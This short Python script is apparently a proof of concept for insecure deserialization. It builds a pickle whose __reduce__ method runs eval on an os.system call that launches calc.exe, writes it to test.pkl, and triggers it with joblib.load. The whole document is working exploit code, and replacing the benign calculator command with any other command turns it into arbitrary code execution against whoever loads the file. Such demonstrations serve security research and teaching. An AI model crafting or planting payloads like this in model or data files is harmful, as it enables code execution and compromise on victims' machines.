import joblib
import pickle
class A(object):
    def __reduce__(self):
        return eval,("__import__('os').system('calc.exe')",)

x = []
x.append(A())
res = pickle.dumps(x)
open("test.pkl","wb").write(res)
joblib.load("test.pkl")